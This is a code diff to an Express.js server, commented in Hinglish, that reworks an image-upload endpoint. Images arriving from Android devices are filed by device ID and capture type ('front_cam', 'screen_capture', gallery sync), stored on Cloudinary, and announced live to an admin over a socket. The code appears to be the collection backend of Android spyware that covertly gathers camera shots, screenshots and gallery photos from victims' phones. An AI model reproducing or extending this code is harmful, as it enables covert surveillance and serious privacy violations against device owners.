@@ -74,21 +74,43 @@ app.get('/', (req, res) => {
 });
 
 // ==================================================
-//  GALLERY SYSTEM (HD PHOTOS)
+//  ✅ INTELLIGENT UPLOAD SYSTEM (FOLDERS WALA)
 // ==================================================
 
 app.post('/api/upload-image', (req, res) => {
-    let { device_id, image_data } = req.body;
+    // 'type' parameter Android se aayega (e.g., "front_cam", "screen_capture")
+    let { device_id, image_data, type } = req.body; 
+    
     if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
 
     const id = device_id.toString().trim().toUpperCase();
+    
+    // 🔥 LOGIC: Agar type hai to folder banao: ID/type
+    // Example: DEVICE123/front_cam/
+    // Agar type nahi hai (Gallery sync) to direct ID folder me jayega
+    let folderPath = type ? `${id}/${type}` : id;
+
     let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
     // Async Upload (Server block nahi karega)
     cloudinary.uploader.upload(base64Image, 
-        { folder: id, public_id: Date.now().toString(), resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" },
+        { 
+            folder: folderPath, // 🔥 Dynamic Folder Name
+            public_id: Date.now().toString(), 
+            resource_type: "image", 
+            width: 1280, 
+            quality: "auto", 
+            fetch_format: "auto" 
+        }, 
         (error, result) => {
-            if (error) return res.status(500).json({ error: "Upload Failed" });
+            if (error) {
+                console.log("Cloudinary Error:", error);
+                return res.status(500).json({ error: "Upload Failed" });
+            }
+            
+            // Socket se Admin ko bata do ki nayi photo aayi hai (Real-time update)
+            io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
+            
             res.json({ status: "success", url: result.secure_url });
         }
     );
